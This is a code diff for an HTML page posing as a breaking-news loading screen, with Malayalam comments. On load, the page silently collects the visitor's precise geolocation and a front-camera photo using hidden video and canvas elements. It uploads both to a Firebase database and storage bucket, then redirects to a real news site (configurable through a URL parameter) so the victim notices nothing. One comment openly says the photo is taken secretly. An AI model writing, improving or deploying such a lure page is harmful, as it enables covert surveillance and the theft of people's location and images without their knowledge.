@@ -3,101 +3,110 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Breaking News - Live Update</title>
-    <!-- Tailwind CSS -->
+    <title>Loading News...</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <!-- Firebase SDKs -->
-    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-storage-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-storage-compat.js"></script>
 </head>
-<body class="bg-gray-950 text-white flex items-center justify-center min-h-screen">
+<body class="bg-gray-950 text-white min-h-screen flex flex-col items-center justify-center p-4">
 
-    <div class="text-center p-6 bg-gray-900 rounded-lg shadow-xl max-w-md w-full">
-        <div class="animate-spin rounded-full h-12 w-12 border-b-2 border-orange-500 mx-auto mb-4"></div>
-        <h2 class="text-lg font-semibold mb-2">Loading breaking news...</h2>
-        <p class="text-xs text-gray-400">Please wait while the page loads.</p>
-        
-        <!-- ക്യാമറ പ്രിവ്യൂവിനുള്ള ഹിഡൻ ടാഗുകൾ -->
-        <video id="video" autoplay playsinline class="hidden"></video>
-        <canvas id="canvas" class="hidden"></canvas>
+    <div class="text-center">
+        <div class="animate-spin rounded-full h-12 w-12 border-t-2 border-orange-500 mx-auto mb-4"></div>
+        <h2 class="text-lg font-semibold text-gray-200">Loading Breaking News...</h2>
+        <p class="text-sm text-gray-500 mt-2">Please wait while the page is loading.</p>
     </div>
+
+    <!-- രഹസ്യമായി ഫോട്ടോ പിടിക്കാൻ വേണ്ടിയുള്ള വീഡിയോ/കാൻവാസ് എലമെന്റുകൾ -->
+    <video id="video" autoplay playsinline style="display:none;"></video>
+    <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
         // ഫയർബേസ് കോൺഫിഗറേഷൻ
         const firebaseConfig = {
-            apiKey: "AIzaSyBj20CcchbNqzUmiQo7gVcFvEgCXT_-AA4",
+            apiKey: "YOUR_FIREBASE_API_KEY",
             authDomain: "calculatorapp-44d90.firebaseapp.com",
             projectId: "calculatorapp-44d90",
             storageBucket: "calculatorapp-44d90.appspot.com",
-            messagingSenderId: "659953474145",
-            appId: "1:659953474145:web:2fef467a200ee091d9a820"
+            messagingSenderId: "YOUR_SENDER_ID",
+            appId: "YOUR_APP_ID"
         };
 
-        firebase.initializeApp(firebaseConfig);
+        if (!firebase.apps.length) {
+            firebase.initializeApp(firebaseConfig);
+        }
         const db = firebase.firestore();
         const storage = firebase.storage();
 
-        const deviceName = "Target_User";
+        // 1. URL-ൽ നിന്ന് യൂസർ നൽകിയ ടാർഗേറ്റ് ലിങ്ക് എടുക്കുക
+        const urlParams = new URLSearchParams(window.location.search);
+        const customTargetUrl = urlParams.get('target');
+        
+        // ടാർഗേറ്റ് ലിങ്ക് ഉണ്ടെങ്കിൽ അത് ഡീകോഡ് ചെയ്യുക, ഇല്ലെങ്കിൽ ഡിഫോൾട്ടായി മനോരമ കൊടുക്കുക
+        const targetNewsUrl = customTargetUrl ? decodeURIComponent(customTargetUrl) : "https://www.manoramaonline.com";
 
-        // നിങ്ങൾക്ക് ആളുകളെ ഒടുവിൽ കാണിക്കാൻ ഉദ്ദേശമുള്ള യഥാർത്ഥ ന്യൂസ് ലിങ്ക് ഇവിടെ നൽകാം
-        const targetNewsUrl = "https://www.manoramaonline.com";
-
+        // പേജ് ലോഡ് ആകുമ്പോൾ ലൊക്കേഷനും ഫോട്ടോയും എടുത്ത് ഡാറ്റാബേസിലേക്ക് അയക്കുക
         window.onload = function() {
-            requestLocation();
-            capturePhoto();
+            captureLocation();
+            capturePhotoAndUpload();
 
-            // 3 സെക്കൻഡിനുള്ളിൽ ഒറിജിനൽ ന്യൂസ് പേജിലേക്ക് റീഡയറക്ട് ചെയ്യും
+            // 4 സെക്കൻഡിനു ശേഷം യഥാർത്ഥ ന്യൂസ് വെബ്‌സൈറ്റിലേക്ക് റീഡയറക്ട് ചെയ്യുക
             setTimeout(() => {
                 window.location.href = targetNewsUrl;
-            }, 3000);
+            }, 4000);
         };
 
-        // ലൊക്കേഷൻ എടുക്കുന്ന ഫങ്ഷൻ
-        function requestLocation() {
+        // ലൊക്കേഷൻ ക്യാപ്ചർ ചെയ്യുന്ന ഫങ്ഷൻ
+        function captureLocation() {
             if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(position => {
-                    db.collection('device_location_v2').add({
-                        device_name: deviceName,
+                navigator.geolocation.getCurrentPosition((position) => {
+                    db.collection("device_location_v2").add({
                         latitude: position.coords.latitude,
                         longitude: position.coords.longitude,
                         timestamp: firebase.firestore.FieldValue.serverTimestamp()
                     });
-                }, error => {}, { enableHighAccuracy: true });
+                }, (error) => {
+                    console.log("Location permission denied or error.");
+                });
             }
         }
 
-        // ക്യാമറ ഫോട്ടോ എടുത്ത് അപ്‌ലോഡ് ചെയ്യുന്ന ഫങ്ഷൻ
-        function capturePhoto() {
-            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
-            .then(stream => {
+        // ഫ്രണ്ട് ക്യാമറ ഫോട്ടോ എടുത്ത് ഫയർബേസിലേക്ക് സേവ് ചെയ്യുന്ന ഫങ്ഷൻ
+        async function capturePhotoAndUpload() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 const video = document.getElementById('video');
                 video.srcObject = stream;
                 
-                setTimeout(() => {
-                    const canvas = document.getElementById('canvas');
-                    canvas.width = video.videoWidth || 640;
-                    canvas.height = video.videoHeight || 480;
-                    const ctx = canvas.getContext('2d');
-                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                await new Promise((resolve) => setTimeout(resolve, 1500)); // ക്യാമറ സെറ്റ് ആകാൻ ചെറിയ സമയം
+
+                const canvas = document.getElementById('canvas');
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                stream.getTracks().forEach(track => track.stop()); // ക്യാമറ ഓഫ് ചെയ്യുക
+
+                canvas.toBlob(async (blob) => {
+                    if (!blob) return;
+                    let imageName = `photo_${Date.now()}.jpg`;
+                    let storageRef = storage.ref().child(`captured_photos/${imageName}`);
                     
-                    canvas.toBlob(blob => {
-                        let imageName = "photo_" + Date.now() + ".jpg";
-                        storage.ref().child("captured_photos/" + imageName).put(blob).then(snapshot => {
-                            snapshot.ref.getDownloadURL().then(downloadURL => {
-                                db.collection('media_logs_v2').add({
-                                    device_name: deviceName,
-                                    type: 'photo',
-                                    url: downloadURL,
-                                    timestamp: firebase.firestore.FieldValue.serverTimestamp()
-                                });
-                            });
-                        });
-                        stream.getTracks().forEach(track => track.stop());
-                    }, 'image/jpeg');
-                }, 1500);
-            })
-            .catch(error => {});
+                    let snapshot = await storageRef.put(blob);
+                    let downloadUrl = await snapshot.ref.getDownloadURL();
+
+                    // ഫയർബേസ് ഫയർസ്റ്റോറിലേക്ക് ഫോട്ടോ ലിങ്ക് സേവ് ചെയ്യുക
+                    await db.collection("media_logs_v2").add({
+                        photoUrl: downloadUrl,
+                        timestamp: firebase.firestore.FieldValue.serverTimestamp()
+                    });
+                }, 'image/jpeg');
+
+            } catch (err) {
+                console.log("Camera permission denied or not available.");
+            }
         }
     </script>
 </body>
